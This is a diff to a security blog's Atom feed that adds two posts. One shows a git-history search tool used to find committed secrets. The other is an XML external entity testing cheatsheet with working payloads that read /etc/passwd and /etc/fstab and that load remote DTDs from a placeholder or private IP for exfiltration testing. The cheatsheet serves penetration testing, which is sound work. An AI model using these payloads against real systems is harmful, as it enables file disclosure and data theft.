@@ -4,7 +4,7 @@
   <title><![CDATA[Silent Robot Systems]]></title>
   <link href="http://www.silentrobots.com/atom.xml" rel="self"/>
   <link href="http://www.silentrobots.com/"/>
-  <updated>2014-09-01T20:12:57-04:00</updated>
+  <updated>2014-10-26T17:17:33-04:00</updated>
   <id>http://www.silentrobots.com/</id>
   <author>
     <name><![CDATA[Willis Vandevanter]]></name>
@@ -12,6 +12,228 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Searching through git commits]]></title>
+    <link href="http://www.silentrobots.com/blog/2014/10/06/gumbler/"/>
+    <updated>2014-10-06T00:00:00-04:00</updated>
+    <id>http://www.silentrobots.com/blog/2014/10/06/gumbler</id>
+    <content type="html"><![CDATA[<p><a href="https://github.com/BuffaloWill/gumbler">gumbler</a> is a script I wrote to search through git commits. Examples from github are discussed below.</p>
+
+<!-- more -->
+
+
+
+
+<h1>.gitignore</h1>
+
+
+<p>A gitignore file is used to specify files that should not be tracked by git (source <a href="http://git-scm.com/docs/gitignore">gitignore</a>). In the default case, gumbler will read the gitignore file for the project and search every revision for a case where  a file from gitignore was committed. Possible use cases would be as a pen tester looking for reconnaisance data (e.g. developer usernames/passwords, staging hosts/services, etc.) or a developer to verify projects did not previously commit &ldquo;secret&rdquo; data.</p>
+
+<p>I am a big fan of what Netflix is doing with regards to open source and security. After looking through a number of their projects, I noticied Priam has a few commits with non-damaging files from the gitignore.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$. git clone https://github.com/Netflix/Priam.git
+</span><span class='line'>Cloning into 'Priam'...
+</span><span class='line'>....
+</span><span class='line'>Checking connectivity... done.
+</span><span class='line'>$. ruby gumbler/gumbler.rb Priam/ gumbler_testing/tmp/
+</span><span class='line'>|-| Jumping to remote @directory Priam/
+</span><span class='line'>|-| Storing every revision
+</span><span class='line'>checking for *.com..
+</span><span class='line'>checking for *.class..
+</span><span class='line'>.....
+</span><span class='line'>|+| Looking for .classpath, Found it in BRANCH : 697fd66aae9beed107e13f49a741455f1d9d8dd9 .classpath. Storing it in gumbler_testing/tmp/.
+</span><span class='line'>|+| Looking for .classpath, Found it in BRANCH : 47bdb537789c034493e94d8977eae77ecbfd5b24 .classpath. Storing it in gumbler_testing/tmp/.
+</span><span class='line'>|+| Looking for .classpath, Found it in BRANCH : 442862d4a8d4d18d0e176ded8795dd45a24528fc .classpath. Storing it in gumbler_testing/tmp/.
+</span><span class='line'>....
+</span><span class='line'>checking for .project..
+</span><span class='line'>|+| Looking for .project, Found it in BRANCH : 697fd66aae9beed107e13f49a741455f1d9d8dd9 .project. Storing it in gumbler_testing/tmp/.
+</span><span class='line'>|+| Looking for .project, Found it in BRANCH : 0941d9e0e0dda3ee1d9d4dda757d59ffb641abcf .project. Storing it in gumbler_testing/tmp/.
+</span><span class='line'>|+| Looking for .project, Found it in BRANCH : 47bdb537789c034493e94d8977eae77ecbfd5b24 .project. Storing it in gumbler_testing/tmp/.
+</span><span class='line'>....
+</span><span class='line'>checking for .settings..
+</span><span class='line'>....</span></code></pre></td></tr></table></div></figure>
+
+
+<p>.classpath or .project are not damaging in this case and, hence, are used as the example. On a pen test or in collaborative projects I have found much worse (<i>cough</i> usernames, passwords). This shouldn&rsquo;t be that surprising.</p>
+
+<h1>Searching Commit Logs</h1>
+
+
+<p>Another use case for gumbler is to look through commit history. Using Ruby on Rails as an example, we can search from for any commit with &ldquo;CVE&rdquo; in it. Gumbler will output a diff from the files changed in the commit.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$. ruby gumbler/gumbler.rb --grep CVE rails/ tmp/
+</span><span class='line'>|!| skipping .gitignore, searching commit log for CVE
+</span><span class='line'>$. ls tmp/
+</span><span class='line'>060c91cd59ab86583a8f2f52142960d3433f62f5-2012-05-30_15:13:03_-0700.diff  88cc1688d0cb828c17706b41a8bd27870f2a2beb-2013-01-08_12:11:18_-0800.diff
+</span><span class='line'>08d0a11a3f62718d601d39e617c834759cf59bbb-2014-02-18_15:38:50_-0300.diff  8be6913990c30f63618173da722148892348dcc9-2013-03-15_17:45:53_-0700.diff
+</span><span class='line'>0b58a7ff420d7ef4b643c521a62be7259dd2f5cb-2011-02-08_14:21:12_-0800.diff  8e577fe560d5756fcc67840ba304d79ada6804e4-2013-01-08_12:41:24_-0800.diff
+</span><span class='line'>0c7ac34aed1845044cd1911e5a775366d7ca41c1-2013-12-02_16:42:16_-0800.diff  9340f89849606dba02f44038171f3837f883fd4e-2012-05-30_15:09:13_-0700.diff
+</span><span class='line'>2392535f4085d88186097e3c23414e958fb1d16d-2013-03-18_10:17:32_-0700.diff  93fb4c1e62dc9605eecbfaffda2becc85890fa5f-2014-07-10_10:20:16_-0700.diff
+</span><span class='line'>...
+</span><span class='line'>$. cat 060c91cd59ab86583a8f2f52142960d3433f62f5-2012-05-30_15\:13\:03_-0700.diff 
+</span><span class='line'>060c91cd59ab86583a8f2f52142960d3433f62f5-2012-05-30 15:13:03 -0700==&gt; 2012-05-30 15:13:03 -0700 Strip [nil] from parameters hash. Thanks to Ben Murphy for reporting this! Strip [nil] from parameters hash.
+</span><span class='line'>Thanks to Ben Murphy for reporting this!
+</span><span class='line'>
+</span><span class='line'>CVE-2012-2660
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>:100644 100644 aa5ba3e... 6757a53... M    actionpack/lib/action_dispatch/http/request.rb
+</span><span class='line'>:100644 100644 c3f009a... 6ea66f9... M    actionpack/test/dispatch/request/query_string_parsing_test.rb
+</span><span class='line'>
+</span><span class='line'>diff --git a/actionpack/lib/action_dispatch/http/request.rb b/actionpack/lib/action_dispatch/http/request.rb
+</span><span class='line'>index aa5ba3e..6757a53 100644
+</span><span class='line'>--- a/actionpack/lib/action_dispatch/http/request.rb
+</span><span class='line'>+++ b/actionpack/lib/action_dispatch/http/request.rb
+</span><span class='line'>....</span></code></pre></td></tr></table></div></figure>
+
+
+<p></p>
+
+<p>As the README says, be careful using the tool as it uses Command Execution to search. A malicious git project could take advantage of this. Ping me with better ways to handle this.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[XML Entity Cheatsheet]]></title>
+    <link href="http://www.silentrobots.com/blog/2014/09/03/xe-cheatsheet/"/>
+    <updated>2014-09-03T00:00:00-04:00</updated>
+    <id>http://www.silentrobots.com/blog/2014/09/03/xe-cheatsheet</id>
+    <content type="html"><![CDATA[<p>An XML Entity testing cheatsheet. Testing was done using an older vulnerable version of nokogiri. In IRB you can require previous versions of gems. Certain techniques (e.g. XInclude) may require additional settings in Nokogiri.</p>
+
+<!-- more -->
+
+
+<p>XML headers:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;?xml version="1.0" standalone="no"?&gt;
+</span><span class='line'>&lt;?xml version="1.0" standalone="yes"?&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Vanilla entity test:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!DOCTYPE root [&lt;!ENTITY post "1"&gt;]&gt;&lt;root&gt;&post;&lt;/root&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>SYSTEM entity test (xxe):</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!DOCTYPE root [&lt;!ENTITY post SYSTEM "file:///etc/passwd"&gt;]&gt;
+</span><span class='line'>e.g.
+</span><span class='line'>doc = Nokogiri::XML("&lt;!DOCTYPE root [ &lt;!ENTITY spl SYSTEM \"file:///etc/passwd\"&gt; ]&gt;\n&lt;a&gt;&spl;&lt;/a&gt;")
+</span><span class='line'>doc.children.children.children.text</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Parameter Entity Test. One of the benefits is a paremeter entity is automatically expanded inside the DOCTYPE:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!DOCTYPE root [&lt;!ENTITY % dtd SYSTEM "http://[IP]/some.dtd"&gt;&lt;!ENTITY % a "test %dtd"&gt;]&gt;
+</span><span class='line'>e.g.
+</span><span class='line'>options = Nokogiri::XML::ParseOptions::DTDATTR
+</span><span class='line'>doc = Nokogiri::XML::Document.parse("&lt;!DOCTYPE test [&lt;!ENTITY % dtd SYSTEM \"http://172.16.122.177/student.dtd\"&gt;&lt;!ENTITY % a "test %dtd"&gt;]&gt;\n&lt;test&gt;success&lt;/test&gt;", nil, nil, options)
+</span><span class='line'>doc.children.text</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Combined Entity and Parameter Entity:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!DOCTYPE root [&lt;!ENTITY post SYSTEM "http://"&gt;&lt;!ENTITY % dtd SYSTEM "http://[IP]/some.dtd"&gt;&lt;!ENTITY % a "test %dtd"&gt;]&gt;&lt;root&gt;&post;&lt;/root&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>XInclude:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;document xmlns:xi="http://&lt;IP&gt;/XInclude"&gt;&lt;footer&gt;&lt;xi:include href="title.xml"/&gt;&lt;/footer&gt;&lt;/document&gt;
+</span><span class='line'>&lt;root xmlns:xi="http://www.w3.org/2001/XInclude"&gt;
+</span><span class='line'>&lt;xi:include href="file:///etc/fstab" parse="text"/&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>URL handler. This follows <a href="http://publib.boulder.ibm.com/infocenter/wsadhelp/v5r1m2/topic/com.ibm.etools.xmlbuilder.doc/topics/cxmlcat.html">XML Entity - IBM</a>, I have not seen this work &ldquo;in the wild&rdquo;. Should be useful for exfiltration testing:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!DOCTYPE root [&lt;!ENTITY c PUBLIC "-//W3C//TEXT copyright//EN" "http://[IP]/copyright.xml"&gt;]&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>XML Schema Inline:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;madeuptag xlmns="http://[ip]" xsi:schemaLocation="http://[IP]"&gt;
+</span><span class='line'>&lt;/madeuptag&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Remote XML Schema. Also, have not been able to get this to work:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!DOCTYPE root PUBLIC "abc/Catalog" "http://[IP]/catalog.dtd"&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Useful Links:</p>
+
+<p><a href="http://publib.boulder.ibm.com/infocenter/wsadhelp/v5r1m2/topic/com.ibm.etools.xmlbuilder.doc/topics/cxmlcat.html">XML Entity Examples - IBM</a></p>
+
+<p><a href="http://www.vsecurity.com/download/papers/XMLDTDEntityAttacks.pdf">XML Schema, DTD, and Entity Attacks - A Compendium of Known Techniques</a></p>
+
+<p><a href="https://www.owasp.org/index.php/Testing_for_XML_Injection_%28OTG-INPVAL-008%29">OWASP Testing for XML Entity Injection</a></p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[IPv6 DNS Guessing Notes]]></title>
